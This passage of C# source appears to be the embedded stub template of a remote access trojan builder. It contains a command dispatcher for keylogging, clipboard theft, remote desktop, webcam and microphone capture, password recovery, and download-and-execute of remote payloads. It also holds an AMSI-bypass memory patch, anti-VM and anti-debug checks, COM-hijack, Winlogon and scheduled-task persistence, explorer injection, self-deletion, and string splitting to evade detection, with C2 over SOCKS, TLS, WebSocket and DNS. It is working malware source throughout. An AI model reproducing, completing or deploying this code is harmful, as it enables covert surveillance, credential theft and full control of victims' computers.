            if (cmd == ""KEYLOG|START"") { StartKl(); return; }
            if (cmd == ""KEYLOG|STOP"") { klRun = false; return; }
#endif

#if FEATURE_CLIPBOARD
            if (cmd == ""CLIP|START"") { StartCl(); return; }
            if (cmd == ""CLIP|STOP"") { clRun = false; return; }
#endif

#if FEATURE_RD
            if (cmd.StartsWith(""RD|START""))
            {
                string[] p = cmd.Split('|');
                int mon = -1;
                double sc = 0.8;
                if (p.Length >= 3) int.TryParse(p[2], out mon);
                if (p.Length >= 4) double.TryParse(p[3], NumberStyles.Float, CultureInfo.InvariantCulture, out sc);
                rdMonitor = mon;
                rdScale = sc <= 0 ? 0.8 : Math.Min(1.0, sc);
                StartRd();
                return;
            }
            if (cmd == ""RD|STOP"") { rdRun = false; return; }
#endif

            if (cmd == ""PASS|RECOVERY"") { PassRecovery(); return; }

#if FEATURE_WEBCAM
            if (cmd == ""WEBCAM"") { CamShot(); return; }
#endif

#if FEATURE_AUDIO
            if (cmd.StartsWith(""AUDIO""))
            {
                int ms = 5000;
                int i = cmd.IndexOf('|');
                if (i > 0) int.TryParse(cmd.Substring(i + 1), out ms);
                MicRec(ms);
                return;
            }
#endif

#if FEATURE_ELEVATE
            if (cmd == ""ELEVATE"") { ElevateNow(); return; }
#endif

            if (cmd.StartsWith(""MOUSE|""))
            {
                string[] p = cmd.Split('|');
                if (p.Length == 4)
                {
                    int x, y;
                    if (!int.TryParse(p[1], out x) || !int.TryParse(p[2], out y)) return;
                    SetCursorPos(x, y);
                    uint f = p[3] == ""1"" ? 0x0002u : 0x0008u;
                    mouse_event(f, 0, 0, 0, UIntPtr.Zero);
                    mouse_event(f == 0x0002u ? 0x0004u : 0x0010u, 0, 0, 0, UIntPtr.Zero);
                }
                return;
            }

            if (cmd.StartsWith(""KEYS|"")) { KeysAsync(cmd.Substring(5)); return; }

            if (cmd.StartsWith(""DOWNLOAD|EXEC|""))
            {
                string url = cmd.Substring(14);
                ThreadPool.QueueUserWorkItem(_ =>
                {
                    try
                    {
                        string tmp = WorkFile("".exe"");
                        using (var wc = new WebClient()) wc.DownloadFile(url, tmp);
                        Hide(tmp);
                        Process.Start(tmp);
                    }
                    catch { }
                });
                return;
            }

            if (cmd.StartsWith(""UPLOAD|EXEC|""))
            {
                string[] p = cmd.Split(new[] { '|' }, 4);
                if (p.Length == 4)
                {
                    try
                    {
                        string tmp = WorkFile("".exe"");
                        File.WriteAllBytes(tmp, Convert.FromBase64String(p[3]));
                        Hide(tmp);
                        Process.Start(tmp);
                    }
                    catch { }
                }
                return;
            }

            if (cmd.StartsWith(""MSG|""))
            {
                string[] p = cmd.Substring(4).Split(new[] { '|' }, 3);
                if (p.Length == 3)
                {
                    var icon = MessageBoxIcon.Information;
                    if (p[2] == ""Warning"") icon = MessageBoxIcon.Warning;
                    else if (p[2] == ""Error"") icon = MessageBoxIcon.Error;
                    else if (p[2] == ""Question"") icon = MessageBoxIcon.Question;
                    string tt = p[0], mm = p[1];
                    ThreadPool.QueueUserWorkItem(_ => MessageBox.Show(mm, tt, MessageBoxButtons.OK, icon));
                }
                return;
            }

            if (cmd.StartsWith(""URL|"")) { try { Process.Start(cmd.Substring(4)); } catch { } return; }

            if (cmd.StartsWith(""POWER|""))
            {
                string a = cmd.Substring(6);
                try
                {
                    string sd = ""shut"" + ""down"";
                    if (a == ""SHUTDOWN"") Process.Start(sd, ""/s /t 0"");
                    else if (a == ""RESTART"") Process.Start(sd, ""/r /t 0"");
                    else if (a == ""LOGOFF"") Process.Start(sd, ""/l"");
                    else if (a == ""STANDBY"") Application.SetSuspendState(PowerState.Suspend, true, true);
                }
                catch { }
                return;
            }

            if (cmd == ""RECONNECT"") { alive = false; return; }
            if (cmd == ""UNINSTALL"") { Uninstall(); return; }
        }

        static void SelfDelete()
        {
            string bat = null;
            try
            {
                string self = SelfPath();
                if (string.IsNullOrEmpty(self)) { Environment.Exit(0); return; }

                bat = Path.Combine(Path.GetTempPath(), ""s"" + Guid.NewGuid().ToString(""N"").Substring(0, 8) + "".bat"");
                File.WriteAllText(bat,
                    ""@echo off\r\n"" +
                    ""timeout /t 3 /nobreak > nul\r\n"" +
                    ""del "" + Q(self) + ""\r\n"" +
                    ""del "" + Q(bat) + ""\r\n"");

                Process.Start(new ProcessStartInfo(""cm"" + ""d.exe"", ""/c "" + Q(bat))
                { WindowStyle = ProcessWindowStyle.Hidden, UseShellExecute = true });
            }
            catch { }
            Environment.Exit(0);
        }

        static void RelocateAndDelete()
        {
            try
            {
                string self = SelfPath();
                if (string.IsNullOrEmpty(self)) return;

                string dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), OD_SUB);
                Directory.CreateDirectory(dir);
                string dest = Path.Combine(dir, EXE_NAME);

                if (SamePath(self, dest)) return;

                File.Copy(self, dest, true);
                if (HIDE_FILE) Hide(dest);

                Process.Start(new ProcessStartInfo(dest, ""--m"")
                {
                    WorkingDirectory = dir,
                    UseShellExecute = true
                });

                SelfDelete();
            }
            catch { }
        }

        static void Uninstall()
        {
            string dir = WorkDir();
            try
            {
#if FEATURE_ELEVATE
                Unmark();
#endif
                using (var k = Registry.CurrentUser.OpenSubKey(RUN_KEY, true))
                    if (k != null) k.DeleteValue(RUN_NAME, false);
                Run(""sch"" + ""ta"" + ""sks"", ""/delete /tn "" + Q(TASK_NAME) + "" /f"");
                Run(""s"" + ""c"", ""delete "" + TASK_NAME);
                try { File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), RUN_NAME + "".lnk"")); } catch { }
                try { Registry.CurrentUser.DeleteSubKeyTree(""Soft"" + ""ware\\Clas"" + ""ses\\CLSID\\{BCDE0395-E52F-467C-8E3D-C4579291692E}"", false); } catch { }
                try { Registry.CurrentUser.DeleteSubKeyTree(""SOFT"" + ""WARE\\Micro"" + ""soft\\Windows NT\\Current"" + ""Version\\Winlogon\\Notify\\crypt32"", false); } catch { }
                try { foreach (string f in Directory.GetFiles(dir, FP + ""*"")) File.Delete(f); } catch { }
            }
            catch { }

            SelfDelete();
        }

        static bool ReadFull(Stream ns, byte[] buf)
        {
            int r = 0;
            while (r < buf.Length)
            {
                int x = ns.Read(buf, r, buf.Length - r);
                if (x <= 0) return false;
                r += x;
            }
            return true;
        }

        static bool Socks(TcpClient c, string phost, int pport, string host, int port, string user, string pass)
        {
            c.Connect(phost, pport);
            var ns = c.GetStream();
            ns.ReadTimeout = 10000;

            byte[] greet = string.IsNullOrEmpty(user) ? new byte[] { 5, 1, 0 } : new byte[] { 5, 2, 0, 2 };
            ns.Write(greet, 0, greet.Length);

            byte[] rep = new byte[2];
            if (!ReadFull(ns, rep) || rep[1] == 0xFF) return false;

            if (rep[1] == 2)
            {
                byte[] u = Encoding.UTF8.GetBytes(user);
                byte[] p = Encoding.UTF8.GetBytes(pass);
                byte[] auth = new byte[3 + u.Length + p.Length];
                auth[0] = 1;
                auth[1] = (byte)u.Length;
                Buffer.BlockCopy(u, 0, auth, 2, u.Length);
                auth[2 + u.Length] = (byte)p.Length;
                Buffer.BlockCopy(p, 0, auth, 3 + u.Length, p.Length);
                ns.Write(auth, 0, auth.Length);

                byte[] ar = new byte[2];
                if (!ReadFull(ns, ar) || ar[1] != 0) return false;
            }

            byte[] hb = Encoding.UTF8.GetBytes(host);
            byte[] req = new byte[5 + hb.Length + 2];
            req[0] = 5; req[1] = 1; req[2] = 0; req[3] = 3; req[4] = (byte)hb.Length;
            Buffer.BlockCopy(hb, 0, req, 5, hb.Length);
            req[5 + hb.Length] = (byte)(port >> 8);
            req[6 + hb.Length] = (byte)(port & 0xFF);
            ns.Write(req, 0, req.Length);

            byte[] head = new byte[4];
            if (!ReadFull(ns, head)) return false;
            if (head[1] != 0) return false;

            int skip;
            if (head[3] == 1) skip = 4;
            else if (head[3] == 4) skip = 16;
            else if (head[3] == 3) { byte[] l = new byte[1]; if (!ReadFull(ns, l)) return false; skip = l[0]; }
            else return false;

            byte[] dump = new byte[skip + 2];
            if (!ReadFull(ns, dump)) return false;

            ns.ReadTimeout = 0;
            return true;
        }

        static bool Hello()
        {
            int up = Environment.TickCount / 1000;

            string av = """", ram = """", cam = """";
            int mon = 1;
#if FEATURE_RECON
            av = Clean(AvName());
            ram = RamGb();
            cam = CamCount();
            mon = MonCount();
#endif

            SendPlain(""HELLO|"" + SID + ""|"" + Clean(TAG) + ""|"" + Environment.UserName + ""@"" + Environment.MachineName + ""|"" + VERSION + ""|"" + Clean(Environment.OSVersion.ToString()) + ""|"" + (IsAdmin() ? ""1"" : ""0"") + ""|"" + av + ""|"" + ram + ""|"" + cam + ""|"" + (string.IsNullOrEmpty(AESKEY) ? ""0"" : ""1"") + ""|"" + up + ""|"" + mon);

            if (string.IsNullOrEmpty(AESKEY)) { SKEY = """"; return false; }

            string salt = Recv();
            if (salt == null || !salt.StartsWith(""SALT|"", StringComparison.Ordinal)) { SKEY = """"; return false; }

            SKEY = AESKEY + ""|"" + salt.Substring(5);
            return true;
        }

        static void Pump(int g)
        {
            new Thread(() => HeartLoop(g)) { IsBackground = true }.Start();
#if FEATURE_MEMORY
            new Thread(() => LoaderPing(g)) { IsBackground = true }.Start();
#endif

            while (alive && GEN == g)
            {
                string cmd = Recv();
                if (cmd == null) break;
                if (cmd == ""PING"") continue;
                try { Dispatch(cmd); } catch { }
            }

            alive = false;
        }

        static bool Connect(string host, int mode)
        {
            TcpClient c = null;
            int g = ++GEN;
            try
            {
                ConnLog(host + "":"" + PORT + "" "" + mode);

                c = new TcpClient();
                c.ReceiveTimeout = 15000;
                c.SendTimeout = 15000;

                if (USE_SOCKS) { if (!Socks(c, S_HOST, S_PORT, host, PORT, S_USER, S_PASS)) { ConnLog(""proxy failed""); return false; } }
                else c.Connect(host, PORT);

                c.NoDelay = true;
                c.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                Stream st = c.GetStream();

#if FEATURE_TLS
                if (USE_TLS || mode == 1)
                {
                    var ssl = new System.Net.Security.SslStream(st, false, new System.Net.Security.RemoteCertificateValidationCallback(CertOk));
                    ssl.AuthenticateAsClient(host);
                    st = ssl;
                }
#endif

#if FEATURE_WS
                if (mode == 0)
                {
                    if (!WsHandshake(st, host)) { ConnLog(""ws failed""); try { c.Close(); } catch { } return false; }
                    WS = true;
                }
                else WS = false;
#else
                WS = false;
#endif

                NS = st;
                alive = true;
                SKEY = """";
                LAST_SEND = Environment.TickCount;

#if FEATURE_PERSIST
                if (!autostartDone && AUTOSTART != ""Yok"") { autostartDone = true; try { Autostart(); } catch { } }
#endif

                if (!Hello()) { ConnLog(""no aes""); return false; }

                c.ReceiveTimeout = 0;
                c.SendTimeout = 0;

                ConnLog(""connected"");
                Pump(g);
                return true;
            }
            catch (Exception ex) { ConnLog(ex.Message); return false; }
            finally
            {
                alive = false;
                rdRun = false; klRun = false; clRun = false;
                NS = null;
                WS = false;
                SKEY = """";
                if (c != null) { try { c.Close(); } catch { } }
            }
        }

#if FEATURE_DNS
        static bool ConnectDns(string host)
        {
            int g = ++GEN;
            try
            {
                ConnLog(""dns "" + host);
                NS = new DnsStream(host, 53);
                WS = false;
                alive = true;
                SKEY = """";
                LAST_SEND = Environment.TickCount;

#if FEATURE_PERSIST
                if (!autostartDone && AUTOSTART != ""Yok"") { autostartDone = true; try { Autostart(); } catch { } }
#endif

                if (!Hello()) { ConnLog(""no aes""); return false; }

                Pump(g);
                return true;
            }
            catch { return false; }
            finally
            {
                alive = false;
                rdRun = false; klRun = false; clRun = false;
                NS = null;
                WS = false;
                SKEY = """";
            }
        }
#endif

        static bool TryMode(int mode, string host)
        {
            if (string.IsNullOrEmpty(host)) return false;
#if FEATURE_DNS
            if (mode == 3) return ConnectDns(host);
#endif
            return Connect(host, mode);
        }

        static void StartWakeListener()
        {
            if (wakeStarted) return;
            wakeStarted = true;

            var t = new Thread(() =>
            {
                UdpClient udp = null;
                while (true)
                {
                    try
                    {
                        if (udp == null)
                        {
                            udp = new UdpClient();
                            udp.ExclusiveAddressUse = false;
                            udp.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                            udp.Client.Bind(new IPEndPoint(IPAddress.Any, WAKE_PORT));
                        }

                        var ep = new IPEndPoint(IPAddress.Any, 0);
                        byte[] d = udp.Receive(ref ep);
                        if (d == null || d.Length == 0) continue;

                        string s = Encoding.UTF8.GetString(d);
                        if (s.StartsWith(""WAKE"")) WAKE = true;
                    }
                    catch
                    {
                        try { if (udp != null) udp.Close(); } catch { }
                        udp = null;
                        Thread.Sleep(5000);
                    }
                }
            }) { IsBackground = true };
            t.Start();
        }

#if FEATURE_AMSI_BYPASS
        static void PatchAmsi()
        {
            try
            {
                string dll = ""am"" + ""si.dll"";
                string fn = ""Amsi"" + ""Scan"" + ""Buffer"";

                IntPtr h = Api.LoadLibraryA(dll);
                if (h == IntPtr.Zero) return;
                IntPtr p = Api.GetProcAddress(h, fn);
                if (p == IntPtr.Zero) return;

                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                uint old;
                if (!Api.VirtualProtect(p, (UIntPtr)patch.Length, 0x40, out old)) return;
                Marshal.Copy(patch, 0, p, patch.Length);
                uint back;
                Api.VirtualProtect(p, (UIntPtr)patch.Length, old, out back);
            }
            catch { }
        }
#endif

        [STAThread]
        static void Main(string[] args)
        {
            Boot(args);
        }

        internal void Run(string[] args)
        {
            Boot(args);
        }

        internal static void Boot(string[] args)
        {
            try { SetProcessDPIAware(); } catch { }

            string flag = args.Length > 0 ? args[0] : """";
            string flag2 = args.Length > 1 ? args[1] : """";
            bool elevated = flag == ""--e"";
            bool moved = elevated || flag == ""--m"";
            bool injected = Injected();
            bool stage2 = moved || elevated;
            if (flag2 == ""--dll"") IS_DLL = true;

            bool created = false;
            for (int i = 0; i < 60 && !created; i++)
            {
                try
                {
                    var m = new Mutex(true, MUTEX, out created);
                    if (created) { MX = m; break; }
                    try { m.Dispose(); } catch { }
                }
                catch { }
                if (!created) Thread.Sleep(250);
            }
            if (!created && !stage2) return;

#if FEATURE_AMSI_BYPASS
            if (!injected) { try { PatchAmsi(); } catch { } }
#endif

#if FEATURE_ANTIVM
            if (ANTI_VM && IsVm()) return;
#endif
#if FEATURE_ANTIDBG
            if (ANTI_DBG && Debugged()) return;
#endif

            if (!stage2 && !injected) QuietDelay();

#if FEATURE_INSTALL
            if (DO_INSTALL && !injected && !MEMORY_ONLY) Install();
            else if (injected && string.IsNullOrEmpty(INSTALLED))
            {
                try { string t = TargetPath(); if (File.Exists(t)) INSTALLED = t; } catch { }
            }

            SweepWork();
#endif

#if FEATURE_ELEVATE
            if (elevated)
            {
                try { GrantRights(); } catch { }
#if FEATURE_PERSIST
                try { AutostartElevated(); } catch { }
#endif
            }
#endif

#if FEATURE_INSTALL
            if (!IS_DLL && !stage2 && !injected && !MEMORY_ONLY && !string.IsNullOrEmpty(INSTALLED) && !SamePath(INSTALLED, Application.ExecutablePath))
            {
                try
                {
                    Process.Start(new ProcessStartInfo(INSTALLED, ""--m"") { WorkingDirectory = Path.GetDirectoryName(INSTALLED), UseShellExecute = true });
                    ReleaseMutexOnce();
                    Environment.Exit(0);
                }
                catch { }
            }
#endif

#if FEATURE_PERSIST
            if (AUTOSTART != ""Yok"") { autostartDone = true; try { Autostart(); } catch { } }
#endif
#if FEATURE_COMHIJACK
            if (USE_COMHIJACK) { try { InstallComHijack(); } catch { } }
#endif
#if FEATURE_WINLOGON
            if (USE_WINLOGON) { try { InstallWinlogonHelper(); } catch { } }
#endif

#if FEATURE_INJECT
            if (USE_ATTACH && !injected) { try { AttachToExplorer(); } catch { } }
#endif

#if FEATURE_PERSIST
            if (FW_RULE) { try { Firewall(); } catch { } }
#endif

            Splash();

            StartWakeListener();

            var hosts = new List<string>();
            if (!string.IsNullOrEmpty(HOST)) hosts.Add(HOST);
            if (!string.IsNullOrEmpty(FALLBACK) && FALLBACK != HOST) hosts.Add(FALLBACK);

            int[] modes = { 0, 2, 3, 1 };

            while (true)
            {
                bool ok = false;

                foreach (string h in hosts)
                {
                    foreach (int m in modes)
                    {
                        if (ok) break;
                        ok = TryMode(m, h);
                    }
                    if (ok) break;
                }

                if (ok)
                {
                    ConnLog(""reconnect"");
                    for (int i = 0; i < 10 && !WAKE; i++) Thread.Sleep(100);
                    WAKE = false;
                    continue;
                }

                ConnLog(""failed"");
#if FEATURE_INSTALL
                SweepWork();
#endif

                int delay = 180000 + new Random().Next(0, 60000);
                for (int slept = 0; slept < delay && !WAKE; slept += 1000) Thread.Sleep(1000);
                WAKE = false;
            }
        }
    }

    [ComVisible(true)]
    public class ComHook
    {
        public ComHook()
        {
            try
            {
                var t = new Thread(delegate ()
                {
                    try
                    {
                        var p = new Program();
                        p.Run(new string[] { ""--m"", ""--dll"" });
                    }
                    catch { }
                });
                t.SetApartmentState(ApartmentState.STA);
                t.IsBackground = true;
                t.Start();
            }
            catch { }
        }
    }
}
";
    }
}